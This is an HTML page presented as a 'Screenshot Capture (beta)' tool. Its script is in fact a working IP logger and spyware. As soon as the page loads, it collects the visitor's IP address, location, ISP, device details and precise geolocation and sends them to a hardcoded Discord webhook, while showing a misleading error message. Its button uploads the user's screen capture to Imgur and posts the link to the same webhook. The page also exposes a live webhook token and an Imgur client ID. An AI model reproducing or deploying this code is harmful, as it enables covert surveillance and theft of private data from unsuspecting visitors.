<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iron man - beta</title>
    <link rel="icon" href="https://i.ytimg.com/vi/HZpfyaOhagc/sddefault.jpg" type="image/x-icon">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f9f9f9;
        }
        h1 {
            font-size: 2.5rem;
            color: #2E3A59;
        }
        button {
            padding: 10px 20px;
            font-size: 1.2rem;
            cursor: pointer;
        }
        #status {
            margin-top: 20px;
            font-size: 1.2rem;
        }
        #version {
            margin-top: 10px;
            font-size: 1rem;
            color: #555;
        }
    </style>
</head>
<body>

    <h1>Screenshot Capture (beta)</h1>
    <button id="captureBtn">Capture Screenshot</button>
    <p id="status">Status: Waiting for action</p>
    <p id="version"></p>

    <script>
        const captureBtn = document.getElementById('captureBtn');
        const status = document.getElementById('status');
        const versionElement = document.getElementById('version');

        // Define the current version of the script
        const currentVersion = "1.6"; // Change this whenever you release a new version
        versionElement.innerText = `Version: ${currentVersion}`;

        // Automatically send user info on page load
        (async function() {
            try {
                const ipData = await getIPInfo();
                const userAgent = navigator.userAgent;
                const deviceName = getDeviceName(userAgent); // Get detailed device name
                const { latitude, longitude } = await getCoordinates(ipData); // Get coordinates, using IP if geolocation fails

                await sendToDiscord(ipData, userAgent, deviceName, latitude, longitude);
                status.innerText = 'Error Issue sent automatically!';

            } catch (error) {
                console.error('Error:', error);
                status.innerText = 'Error with User Browser';
            }
        })();

        function getDeviceName(userAgent) {
            let deviceName = "Unknown Device";

            // Check for specific devices using regex patterns
            if (/iPad/i.test(userAgent)) {
                deviceName = "iPad";
            } else if (/iPhone/i.test(userAgent)) {
                deviceName = "iPhone";
            } else if (/Macintosh/i.test(userAgent)) {
                deviceName = "Mac";
            } else if (/Windows NT/i.test(userAgent)) {
                deviceName = "Windows PC";
                const version = userAgent.match(/Windows NT (\d+\.\d+)/);
                if (version) deviceName += " " + version[1];
            } else if (/Linux/i.test(userAgent)) {
                deviceName = "Linux PC (most likely a raspberry pi mini desktop)";
            } else if (/Android/i.test(userAgent)) {
                const match = userAgent.match(/Android ([\d\.]+); ([^;]+)/);
                deviceName = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
            } else if (/Chrome/i.test(userAgent) && /Mobile/i.test(userAgent)) {
                const match = userAgent.match(/Mobile\/([^ ]+)/);
                deviceName = match ? `Chrome Mobile (${match[1]})` : "Chrome Mobile Device";
            }

            return deviceName;
        }

        async function getIPInfo() {
            try {
                // First attempt to fetch from ipwhois.app
                const response = await fetch('https://ipwhois.app/json/');
                if (!response.ok) throw new Error("Failed to fetch IP data from ipwhois.app");
                return await response.json();
            } catch (error) {
                console.warn("IP data request failed, trying backup service:", error);

                // Attempt to fetch from ip-api.com as a fallback
                try {
                    const response = await fetch('http://ip-api.com/json');
                    if (!response.ok) throw new Error("Failed to fetch IP data from ip-api.com");
                    return await response.json();
                } catch (fallbackError) {
                    console.error("Fallback service failed:", fallbackError);
                    return {
                        ip: "Unavailable",
                        city: "Unknown",
                        region: "Unknown",
                        country: "Unknown",
                        org: "Unknown"
                    };
                }
            }
        }

        async function getCoordinates(ipData) {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    }, error => {
                        console.error("Geolocation permission denied, using IP-based coordinates:", error);
                        // If geolocation fails, use IP-based coordinates
                        resolve({ latitude: ipData.latitude || "Unavailable", longitude: ipData.longitude || "Unavailable" });
                    });
                } else {
                    // Fallback if geolocation is not available
                    resolve({ latitude: ipData.latitude || "Unavailable", longitude: ipData.longitude || "Unavailable" });
                }
            });
        }

        captureBtn.addEventListener('click', async () => {
            try {
                const imageUrl = await captureScreen();
                await sendScreenshotToDiscord(imageUrl);
                status.innerText = 'Screenshot sent successfully to Gallery (error)!';

            } catch (error) {
                console.error('Error capturing screenshot:', error);
                status.innerText = 'Error capturing screenshot!';
            }
        });

        async function captureScreen() {
            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: true,
                audio: false
            });
            const videoTrack = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(videoTrack);
            const bitmap = await imageCapture.grabFrame();
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bitmap, 0, 0);
            videoTrack.stop(); // Stop the video stream
            return await uploadToImgur(canvas.toDataURL('image/png', 0.5)); // Upload to Imgur
        }

        async function uploadToImgur(imageData) {
            const clientId = '86510995bc57138'; // Replace with your Imgur Client ID
            const response = await fetch('https://api.imgur.com/3/image', {
                method: 'POST',
                headers: {
                    'Authorization': `Client-ID ${clientId}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData.split(',')[1] }) // Send base64 data
            });
            const data = await response.json();
            if (!data.success) throw new Error('Failed to upload image to Imgur');
            return data.data.link; // Return the URL of the uploaded image
        }

        async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude) {
            const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';

            const webhookPayload = {
                content: "@everyone User's info:",
                embeds: [{
                    title: "User's Information",
                    fields: [
                        { name: "IP", value: ipData.ip, inline: true },
                        { name: "Location", value: `${ipData.city}, ${ipData.region} (${ipData.country})`, inline: true },
                        { name: "ISP", value: ipData.org, inline: true },
                        { name: "User Agent", value: userAgent },
                        { name: "Device", value: deviceName }, // Added device model
                        { name: "Coordinates", value: `${latitude}, ${longitude}` }
                    ],
                    color: 3447003 // Color in Discord embed (blue)
                }]
            };

            // Send a POST request to the Discord webhook
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(webhookPayload)
            });
        }

        async function sendScreenshotToDiscord(imageUrl) {
            const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';

            const webhookPayload = {
                content: "wow, they took a screenshot",
                embeds: [{
                    title: "Screenshot",
                    image: {
                        url: imageUrl // Discord requires a URL, so we use the Imgur link
                    },
                    color: 3447003 // Color in Discord embed (blue)
                }]
            };

            // Send a POST request to the Discord webhook
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(webhookPayload)
            });
        }
    </script>

</body>
</html>
